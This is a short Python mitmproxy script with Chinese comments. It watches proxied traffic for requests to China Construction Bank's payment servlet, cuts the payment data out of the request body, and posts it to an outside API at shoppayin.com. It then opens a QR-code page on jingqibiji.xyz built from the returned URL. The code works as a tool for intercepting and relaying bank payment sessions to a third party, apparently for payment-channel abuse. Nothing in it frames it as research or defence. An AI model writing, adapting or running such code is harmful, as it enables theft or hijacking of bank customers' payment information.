# -*- coding: utf-8 -*-
import json
import urllib
from urllib.parse import urlparse
import requests
from mitmproxy import http
import webbrowser
def upload_pay_info(pay_info: str) -> str | None:
    """
    上报支付信息到指定接口
    :param pay_info: 支付信息字符串
    :return: 成功返回消息内容，失败返回 None
    """
    config_url = "http://script-api.shoppayin.com/openApi/ysfbank/add"

    # 构建请求参数
    params = {
        "appSchema": urllib.parse.unquote(pay_info),
        "sysUserId": 2,
        "bank": 'jianshe2',
        "toWho": '中国建设'
    }

    # 配置请求头
    headers = {
        "Content-Type": "application/json"
    }

    try:
        # 发送 POST 请求
        response = requests.post(
            url=config_url,
            json=params,  # 自动处理 JSON 序列化和 Content-Type
            headers=headers,
            timeout=10  # 同时设置连接和读取超时
        )
        print(config_url)
        print(response.status_code)
        print(response.text)
        # 检查 HTTP 状态码
        if response.status_code == 200:
            # 解析 JSON 响应
            api_result = response.json()
            if api_result.get("code") == 0:
                return api_result.get("msg")

        # 记录非成功响应
        print(f"请求失败，状态码: {response.status_code}, 响应内容: {response.text}")
        return None

    except requests.exceptions.RequestException as e:
        print(f"网络请求异常: {str(e)}")
        return None
    except json.JSONDecodeError as e:
        print(f"JSON 解析失败: {str(e)}")
        return None

def addFlow(a, b):
    return a + b
def flowReqHandler(flow: http.HTTPFlow):
    print("请求：" + str(flow.request.url))
    pass

def flowResHandler(flow: http.HTTPFlow):
    print("响应：" + str(flow.request.url))
    if "https://ibsbjstar.ccb.com.cn/CCBIS/CCBWLReqServlet" in flow.request.url:
        text = flow.request.text
        payData = text.split('=')
        print(payData[1])
        pay_url = upload_pay_info(payData[1])
        print(pay_url)
        webbrowser.open(f"http://goto.jingqibiji.xyz/qrcode.html?url={urllib.parse.quote(pay_url)}")